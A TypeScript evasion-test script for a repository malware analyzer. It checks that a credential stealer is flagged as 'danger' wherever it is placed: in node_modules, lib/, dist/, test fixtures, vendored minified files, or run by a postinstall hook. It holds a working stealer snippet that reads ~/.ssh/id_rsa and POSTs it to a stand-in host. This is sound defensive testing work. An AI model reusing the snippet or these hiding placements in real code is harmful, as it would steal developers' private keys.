/**
 * Evasion tests.
 *
 * `test-analyzer` checks the rules fire on malicious fixtures; `backtest`
 * checks they stay quiet on real repositories. This checks the boundary
 * between them — that the machinery which keeps real repos quiet cannot be
 * used to hide.
 *
 * It exists because it caught a genuine hole. Skipping vendored and generated
 * directories outright made a credential stealer in `node_modules/evil/`,
 * `lib/forge-std/src/`, or `dist/` score **zero out of a hundred** — including
 * one that a `postinstall` hook ran directly.
 *
 *   yarn test:evasion
 */
import { analyzeRepo } from "../lib/analyzer";
import type { FileEntry } from "../lib/analyzer/types";

const G = "\x1b[32m", R = "\x1b[31m", D = "\x1b[2m", X = "\x1b[0m";

/** Reads a private key off disk and posts it to a remote host. */
const STEALER = `const os = require("os"), fs = require("fs"), https = require("https");
const key = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
https.request({ hostname: "collect.invalid", path: "/x", method: "POST" }).end(key);`;

interface Case {
  name: string;
  files: Record<string, string>;
}

const CASES: Case[] = [
  {
    name: "plainly in src/",
    files: { "package.json": "{}", "src/setup.js": STEALER },
  },
  {
    name: "hidden in a committed node_modules",
    files: { "package.json": "{}", "node_modules/evil/index.js": STEALER },
  },
  {
    name: "hidden in a Foundry lib/ dependency",
    files: { "foundry.toml": "[profile.default]", "lib/forge-std/src/evil.js": STEALER },
  },
  {
    name: "disguised as a test",
    files: { "package.json": "{}", "test/evil.test.js": STEALER },
  },
  {
    name: "disguised as build output",
    files: { "package.json": "{}", "dist/bundle.js": STEALER },
  },
  {
    name: "in lib/, executed by a postinstall hook",
    files: {
      "foundry.toml": "[profile.default]",
      "package.json": JSON.stringify({
        scripts: { postinstall: "node lib/forge-std/src/evil.js" },
      }),
      "lib/forge-std/src/evil.js": STEALER,
    },
  },
  {
    name: "in a fixtures directory",
    files: { "package.json": "{}", "test/fixtures/seed.js": STEALER },
  },
  {
    name: "in a vendored directory, minified onto one line",
    files: { "package.json": "{}", "vendor/pkg/dist/a.min.js": STEALER },
  },
];

async function main() {
  let failures = 0;
  console.log("\n  A credential stealer must be found wherever it is put.\n");

  for (const testCase of CASES) {
    const tree: FileEntry[] = Object.keys(testCase.files).map((path) => ({
      path,
      type: "blob",
    }));
    const report = await analyzeRepo(
      {
        repo: {
          owner: "x",
          name: "y",
          url: "u",
          ref: "main",
          commit: "c".repeat(40),
          isPrivate: false,
        },
        tree,
        contents: new Map(Object.entries(testCase.files)),
      },
      { skipAI: true },
    );

    // "danger" — anything softer tells the developer to read it rather than
    // not run it, which for a credential stealer is the wrong instruction.
    const ok = report.verdict === "danger";
    if (!ok) failures++;
    const rules = [...new Set(report.findings.map((f) => f.ruleId))].sort();
    console.log(
      `  ${ok ? `${G}PASS${X}` : `${R}FAIL${X}`} ${testCase.name.padEnd(46)} ` +
        `${String(report.threatScore).padStart(3)}/100 ${report.verdict.padEnd(8)} ` +
        `${D}${rules.join(" ") || "nothing found"}${X}`,
    );
  }

  console.log(
    failures === 0
      ? `\n${G}No hiding place found.${X}\n`
      : `\n${R}${failures} case(s) evaded detection.${X}\n`,
  );
  if (failures > 0) process.exit(1);
}

main();
